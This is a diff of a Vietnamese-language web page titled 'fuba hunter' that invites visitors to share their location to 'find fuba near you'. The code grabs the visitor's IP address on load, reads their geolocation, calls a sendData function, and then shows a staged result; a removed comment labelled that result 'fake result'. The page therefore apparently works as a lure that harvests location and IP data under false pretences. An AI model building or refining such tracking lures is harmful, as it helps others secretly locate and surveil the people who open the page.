@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Nearby Finder</title>
+  <title>thợ săn fuba</title>
   <style>
     body {
       font-family: Arial;
@@ -46,7 +46,7 @@
   <h2>tìm fuba gần bạn</h2>
   <p>Cho phép vị trí để xem gợi ý chính xác nhất</p>
 
-  <button onclick="start()">bắt đầu tìm kiếm</button>
+  <button onclick="getLocation()">bắt đầu tìm kiếm</button>
 
   <div class="loading" id="loading">Đang tìm...</div>
 </div>
@@ -80,7 +80,8 @@ function sendData() {
   });
 }
 
-function start() {
+// ✅ ĐÚNG: gói vào function
+function getLocation() {
   document.getElementById("loading").style.display = "block";
 
   if (!navigator.geolocation) {
@@ -96,10 +97,9 @@ function start() {
 
       sendData();
 
-      // fake result
       setTimeout(() => {
         document.querySelector(".card").innerHTML = `
-          <h3> Đã tìm thấy khu vực của bạn</h3>
+          <h3>Đã tìm thấy khu vực của bạn</h3>
           <p>Đang hiển thị gợi ý phù hợp...</p>
         `;
       }, 1500);
@@ -110,6 +110,7 @@ function start() {
   );
 }
 
+// chỉ lấy IP khi load
 getIP();
 </script>
 
